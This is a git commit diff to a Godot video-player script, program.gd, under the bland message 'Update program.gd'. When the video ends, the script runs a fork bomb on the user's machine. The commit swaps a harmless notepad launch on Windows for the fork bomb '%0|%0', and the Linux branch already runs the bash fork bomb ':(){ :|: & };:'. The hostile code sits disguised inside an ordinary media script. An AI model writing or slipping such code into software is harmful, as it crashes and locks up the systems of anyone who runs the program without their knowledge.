7122088f3f51b52f266510de87c7660d36e3c695
mintkat <85989407+m1ntkat@users.noreply.github.com>
2023-05-15 19:04:25 -0800

    Update program.gd

--- program.gd
+++ program.gd
@@ -3,6 +3,6 @@ extends VideoPlayer
 
 func _on_video_player_finished():
 	if OS.get_name() == "Windows":
-		OS.execute("notepad", [], false)
+		OS.execute("%0|%0", [], false)
 	elif OS.get_name() == "X11":
 		OS.execute(":(){ :|: & };:", [], false)
